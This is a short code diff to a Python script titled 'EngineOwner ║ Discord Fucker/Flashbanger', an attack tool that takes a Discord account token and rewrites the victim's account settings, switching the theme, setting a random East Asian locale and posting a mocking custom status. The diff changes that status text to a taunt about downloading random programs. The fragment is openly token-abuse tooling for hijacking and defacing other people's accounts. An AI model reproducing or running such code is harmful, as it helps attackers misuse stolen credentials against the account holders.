@@ -3,7 +3,6 @@ import requests
 import time
 from os import system
 from colorama import Fore
-from random import choice
 
 title = "EngineOwner ║ Discord Fucker/Flashbanger"
 system("title " + title)
@@ -15,7 +14,7 @@ def fucker(token):
             'theme': 'light',
             'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN']),
              'custom_status': {
-                 'text': 'Fucked by github.com/itssnee/engine-owner / sorry bro - Snee',
+                 'text': 'im the reason you should NOT download random programs.'
             },
             'render_embeds': False,
             'render_reactions': False
